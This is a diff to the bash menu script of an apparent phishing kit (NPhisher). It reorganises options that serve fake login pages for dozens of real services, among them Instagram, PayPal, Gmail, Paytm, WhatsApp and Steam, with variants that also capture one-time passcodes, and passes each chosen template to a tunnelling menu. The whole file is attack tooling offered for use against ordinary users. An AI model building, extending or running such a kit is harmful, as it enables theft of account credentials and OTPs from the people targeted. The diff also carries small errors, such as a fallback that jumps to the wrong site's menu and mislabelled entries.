@@ -1072,8 +1072,7 @@ case $reply in
         1 | 01)
                 site_adobe;;
         2 | 02)
-                website="airtelsim"
-		tunnelmenu;;
+                site_airtelsim;;
 	3 | 03)
                 site_airtelxstream;;
 	4 | 04)
@@ -1085,15 +1084,13 @@ case $reply in
 	7 | 07)
                 site_badoo;;
         8 | 08)
-                website="clashofclans"
-		tunnelmenu;;
+                site_clashofclans;;
 	9 | 09)
                 site_date;;
         10)
                 site_devianart;;
 	11)
-                website="dropbox"
-                tunnelmenu;;
+                site_dropbox;;
 	12)
                 site_ebay;;
         13)
@@ -1101,8 +1098,7 @@ case $reply in
 	14)
                 site_flipcart;;
 	15)
-                website="freefire"
-                tunnelmenu;;
+                site_freefire;;
         16)
                 site_github;;
 	17)
@@ -1114,13 +1110,11 @@ case $reply in
 	20)
 		site_gpay;;
 	21)
-                website="icloud"
-                tunnelmenu;;
+                site_icloud;;
 	22)
                 site_instagram;;
 	23)
-                website="jazz"
-                tunnelmenu;;
+                site_jazz;;
         24)
                 site_jio;;
         25)
@@ -1132,38 +1126,31 @@ case $reply in
 	28)
                 site_microsoft;;
 	29)
-                website="mobikwik"
-                tunnelmenu;;
+                site_mobiwik;;
 	30)
                 site_myspace;;
 	31)
                 site_netflix;;
 	32)
-                website="ola"
-                tunnelmenu;;
+                site_ola;;
 	33)
-                website="origin"
-                tunnelmenu;;
+                site_origin;;
 	34)
                 site_paypal;;
 	35)
                 site_paytm;;
 	36)
-                website="phonepay"
-                tunnelmenu;;
+                site_phonepay;;
 	37)
-                website="pinterest"
-                tunnelmenu;;
+                site_pinterest;;
 	38)
 		site_playstation;;
 	39)
                 site_protonmail;;
 	40)
-                website="pubg"
-                tunnelmenu;;
+                site_pubg;;
 	41)
-                website="quora"
-                tunnelmenu;;
+                site_quora;;
 	42)
                 site_reddit;;
 	43)
@@ -1179,14 +1166,11 @@ case $reply in
 	48)
                 site_steam;;
 	49)
-                website="subitoit"
-                tunnelmenu;;
+                site_subitoit;;
 	50)
-                website="telegram"
-                tunnelmenu;;
+                site_telegram;;
 	51)
-                website="telenor"
-                tunnelmenu;;
+                site_telenor;;
 	52)
                 site_tiktok;;
         53)
@@ -1198,13 +1182,11 @@ case $reply in
 	56)
                 site_verizon;;
         57)
-                website="visim"
-                tunnelmenu;;
+                site_visim;;
 	58)
                 site_vk;;
         59)
-                website="whatsapp"
-                tunnelmenu;;
+                site_whatsapp;;
 	60)
                 site_wordpress;;
         61)
@@ -1220,11 +1202,9 @@ case $reply in
 	66)
 		site_jiorouter;;
 	67)
-		website="google_wifi"
-		tunnelmenu;;
+		site_googlewifi;;
 	68)
-		website="pattern"
-		tunnelmenu;;
+		site_pattern;;
 	A | a)
 		xdg-open https://github.com/Alygnt/NPhisher
 		{ sleep 2; clear;  banner; mainmenu; };;
@@ -1250,6 +1230,7 @@ esac
 #WEBSITES
 #adobe
 site_adobe(){
+siname="Adobe"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1264,11 +1245,18 @@ case $choice in
                 tunnelmenu;;
 	*)
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_adobe; };;
+                { sleep 1; banner; site_adobe; };;
 esac
+}
+#airtelsim
+site_airtelsim(){
+website="airtelsim"
+siname="Airtel Sim"
+tunnelmenu
 }
 #airtelxstream
 site_airtelxstream(){
+siname="AirtelXStream"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1283,11 +1271,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_airtelxstream; };;
+                { sleep 1; banner; site_airtelxstream; };;
 esac
 }
 #ajio
 site_ajio(){
+siname="AJIO"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1302,11 +1291,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_ajio; };;
+                { sleep 1; banner; site_ajio; };;
 esac
 }
 #amazon
 site_amazon(){
+siname="Amazon"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1321,11 +1311,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_amazon; };;
+                { sleep 1; banner; site_amazon; };;
 esac
 }
 #apple
 site_apple(){
+siname="Apple"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1340,11 +1331,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_apple; };;
+                { sleep 1; banner; site_apple; };;
 esac
 }
 #badoo
 site_badoo(){
+siname="Badoo"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1359,11 +1351,18 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_badoo; };;
+                { sleep 1; banner; site_badoo; };;
 esac
+}
+#clashofclans
+site_clashofclans(){
+website="clashofclans"
+siname="Clash Of Clans"
+tunnelmenu
 }
 #date
 site_date(){
+siname="Date (Multiple phish)"
 echo -e "${BLUE}[01]${CYAN} Template 1 - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Template 1 - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Template 2 - WITHOUT OTP ${NC}"
@@ -1386,11 +1385,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_date; };;
+                { sleep 1; banner; site_date; };;
 esac
 }
 #devianart
 site_devianart(){
+siname="Devian Art"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1405,11 +1405,18 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_airtelxstream; };;
+                { sleep 1; banner; site_airtelxstream; };;
 esac
+}
+#dropbox
+site_dropbox(){
+website="dropbox"
+siname="Drop Box"
+tunnelmenu
 }
 #ebay
 site_ebay(){
+siname="Ebay"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 -echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1424,11 +1431,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_ebay; };;
+                { sleep 1; banner; site_ebay; };;
 esac
 }
 #facebook
 site_facebook(){
+siname="Facebook"
 echo -e "${BLUE}[01]${CYAN} Facebook - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Facebook - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Facebook Poll - WITHOUT OTP ${NC}"
@@ -1463,11 +1471,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_facebook; };;
+                { sleep 1; banner; site_facebook; };;
 esac
 }
 #flipcart
 site_flipcart(){
+siname="Flipcart"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1485,8 +1494,15 @@ case $choice in
                         { sleep 1; banner; site_flipcart; };;
 esac
 }
+#freefire
+site_freefire(){
+website="freefire"
+siname="Free Fire"
+tunnelmenu
+}
 #github
 site_github(){
+siname="GitHub"
 echo -e "${BLUE}[01]${CYAN} Default - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
@@ -1509,11 +1525,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_github; };;
+                { sleep 1; banner; site_github; };;
 esac
 }
 #gitlab
 site_gitlab(){
+siname="GitLab"
 echo -e "${BLUE}[01]${CYAN} Default - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
@@ -1536,11 +1553,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_gitlab; };;
+                { sleep 1; banner; site_gitlab; };;
 esac
 }
 #gmail
 site_gmail(){
+siname="Gmail"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1555,11 +1573,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_gmail; };;
+                { sleep 1; banner; site_gmail; };;
 esac
 }
 #google
 site_google(){
+siname="Google"
 echo -e "${BLUE}[01]${CYAN} Google - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Google - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Google Poll - WITHOUT OTP ${NC}"
@@ -1590,11 +1609,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_google; };;
+                { sleep 1; banner; site_google; };;
 esac
 }
 #gpay
 site_gpay(){
+siname="Gpay"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1609,11 +1629,18 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_gpay; };;
+                { sleep 1; banner; site_gpay; };;
 esac
+}
+#icloud
+site_icloud(){
+website="icloud"
+siname="iCloud"
+tunnelmenu
 }
 #instagram
 site_instagram(){
+siname="Instagram"
 echo -e "${BLUE}[01]${CYAN} Instagram - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Instagram - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Instagram Advanced - WITHOUT OTP ${NC}"
@@ -1663,16 +1690,23 @@ case $choice in
         11)
                 website="ig_old/otp"
                 tunnelmenu;;
-				12)
-				        website="ig_video"
-				        tunnelmenu;;
+	12)
+	        website="ig_video"
+	        tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_instagram; };;
+                { sleep 1; banner; site_instagram; };;
 esac
+}
+#jazz
+site_jazz(){
+website="jazz"
+siname="Jazz"
+tunnelmenu
 }
 #jio
 site_jio(){
+siname="JIO"
 echo -e "${BLUE}[01]${CYAN} Jio sim ${NC}"
 echo -e "${BLUE}[02]${CYAN} Jio offer ${NC}"
 echo -e " ${NC}"
@@ -1687,11 +1721,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_jio; };;
+                { sleep 1; banner; site_jio; };;
 esac
 }
 #linkedin
 site_linkedin(){
+siname="Linkedin"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1706,11 +1741,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_linkedin; };;
+                { sleep 1; banner; site_linkedin; };;
 esac
 }
 #mediafire
 site_mediafire(){
+siname="Medifire"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1725,11 +1761,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_mediafire; };;
+                { sleep 1; banner; site_mediafire; };;
 esac
 }
 #messenger
 site_messenger(){
+siname="Messenger"
 echo -e "${BLUE}[01]${CYAN} Messenger - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Messenger - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Messenger old - WITHOUT OTP ${NC}"
@@ -1752,11 +1789,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_messenger; };;
+                { sleep 1; banner; site_messenger; };;
 esac
 }
 #microsoft
 site_microsoft(){
+siname="Microsoft"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1771,11 +1809,18 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_microsoft; };;
+                { sleep 1; banner; site_microsoft; };;
 esac
+}
+#mobiwik
+site_mobiwik(){
+website="mobiwik"
+siname="Mobiwik"
+tunnelmenu
 }
 #myspace
 site_myspace(){
+siname="MySpace"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1790,11 +1835,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_myspace; };;
+                { sleep 1; banner; site_myspace; };;
 esac
 }
 #netflix
 site_netflix(){
+siname="Netflix"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1809,11 +1855,24 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_netflix; };;
+                { sleep 1; banner; site_netflix; };;
 esac
+}
+#ola
+site_ola(){
+website="ola"
+siname="OLA"
+tunnelmenu
+}
+#origin
+site_origin(){
+website="origin"
+siname="origin"
+tunnelmenu
 }
 #paypal
 site_paypal(){
+siname="Paypal"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1828,11 +1887,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_paypal; };;
+                { sleep 1; banner; site_paypal; };;
 esac
 }
 #paytm
 site_paytm(){
+siname="Paytm"
 echo -e "${BLUE}[01]${CYAN} Paytm - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Paytm - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Paytm offer - WITHOUT OTP ${NC}"
@@ -1855,11 +1915,24 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_paytm; };;
+                { sleep 1; banner; site_paytm; };;
 esac
+}
+#phonepay
+site_phonepay(){
+website="phonepay"
+siname="Phonepay"
+tunnelmenu
+}
+#origin
+site_pinterest(){
+website="pinterest"
+siname="Pinterest"
+tunnelmenu
 }
 #playstation
 site_playstation(){
+siname="PlayStation"
 echo -e "${BLUE}[01]${CYAN} Playstation 1 - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Playstation 1 - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Playstation 2 - WITHOUT OTP ${NC}"
@@ -1878,11 +1951,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_playstation; };;
+                { sleep 1; banner; site_playstation; };;
 esac
 }
 #protonmail
 site_protonmail(){
+siname="Proton Mail"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1897,11 +1971,24 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_protonmail; };;
+                { sleep 1; banner; site_protonmail; };;
 esac
+}
+#pubg
+site_pubg(){
+website="pubg"
+siname="PUBG"
+tunnelmenu
+}
+#quora
+site_quora(){
+website="quora"
+siname="Quora"
+tunnelmenu
 }
 #reddit
 site_reddit(){
+siname="Reddit"
 echo -e "${BLUE}[01]${CYAN} Reddit ${NC}"
 echo -e "${BLUE}[02]${CYAN} Reddit old ${NC}"
 echo -e " ${NC}"
@@ -1916,11 +2003,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_reddit; };;
+                { sleep 1; banner; site_reddit; };;
 esac
 }
 #shopify
 site_shopify(){
+siname="Shopify"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1935,11 +2023,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_shopify; };;
+                { sleep 1; banner; site_shopify; };;
 esac
 }
 #snapchat
 site_snapchat(){
+siname="Snapchat"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1954,11 +2043,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_snapchat; };;
+                { sleep 1; banner; site_snapchat; };;
 esac
 }
 #socialclub
 site_socialclub(){
+siname="SocialClub"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1973,11 +2063,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_socialclub; };;
+                { sleep 1; banner; site_socialclub; };;
 esac
 }
 #spotify
 site_spotify(){
+siname="Spotify"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -1992,11 +2083,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_spotify; };;
+                { sleep 1; banner; site_spotify; };;
 esac
 }
 #stackoverflow
 site_stackoverflow(){
+siname="Stackoverflow"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2011,11 +2103,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_stackoverflow; };;
+                { sleep 1; banner; site_stackoverflow; };;
 esac
 }
 #steam
 site_steam(){
+siname="Steam"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2030,11 +2123,30 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_steam; };;
+                { sleep 1; banner; site_steam; };;
 esac
+}
+#subitoit
+site_subitoit(){
+website="subitoit"
+siname="Subitoit"
+tunnelmenu
+}
+#telegram
+site_telegram(){
+website="telegram"
+siname="Telegram"
+tunnelmenu
+}
+#telenor
+site_telenor(){
+website="telenor"
+siname="Trgin"
+tunnelmenu
 }
 #tiktok
 site_tiktok(){
+siname="TikTok"
 echo -e "${BLUE}[01]${CYAN} Tiktok - WITH OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
@@ -2058,6 +2170,7 @@ esac
 }
 #twitch
 site_twitch(){
+siname="Twitch"
 echo -e "${BLUE}[01]${CYAN} Twitch - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Twitch - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Twitch New - WITHOUT OTP ${NC}"
@@ -2076,11 +2189,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_twitch; };;
+                { sleep 1; banner; site_twitch; };;
 esac
 }
 #twitter
 site_twitter(){
+siname="Twitter"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2095,11 +2209,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_twitter; };;
+                { sleep 1; banner; site_twitter; };;
 esac
 }
 #ubereats
 site_ubereats(){
+siname="ubereats"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2114,11 +2229,12 @@ case $choice in
                 tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_ubereats; };;
+                { sleep 1; banner; site_ubereats; };;
 esac
 }
 #verizon
 site_verizon(){
+siname="Verizon"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2136,8 +2252,15 @@ case $choice in
                         { sleep 1; banner; site_verizon; };;
 esac
 }
+#visim
+site_visim(){
+website="visim"
+siname="VI sim"
+tunnelmenu
+}
 #vk
 site_vk(){
+siname="VK"
 echo -e "${BLUE}[01]${CYAN} VK - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} VK - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} VK poll - WITHOUT OTP ${NC}"
@@ -2159,9 +2282,15 @@ case $choice in
                         { sleep 1; banner; site_vk; };;
 esac
 }
-
+#whatsapp
+site_whatsapp(){
+website="whatsapp"
+siname="WhatsApp"
+tunnelmenu
+}
 #wordpress
 site_wordpress(){
+siname="Wordpress"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2181,6 +2310,7 @@ esac
 }
 #xbox
 site_xbox(){
+siname="Xbox"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2200,6 +2330,7 @@ esac
 }
 #yahoo
 site_yahoo(){
+siname="Yahoo"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2219,6 +2350,7 @@ esac
 }
 #yandex
 site_yandex(){
+siname="Yandex"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2238,6 +2370,7 @@ esac
 }
 #ytsubs
 site_ytsubs(){
+siname="YT subs"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2258,6 +2391,7 @@ esac
 
 #discord
 site_discord(){
+siname="Discord"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2277,6 +2411,7 @@ esac
 }
 #jiorouter
 site_jiorouter(){
+siname="Jio Router"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2294,7 +2429,18 @@ case $choice in
                         { sleep 1; banner; site_jiorouter; };;
 esac
 }
-
+#googlewifi
+site_googlewifi(){
+website="googlewifi"
+siname="Google WIFI"
+tunnelmenu
+}
+#pattern
+site_pattern(){
+website="pattern"
+siname="Pattern"
+tunnelmenu
+}
 
 ##MAIN
 clear
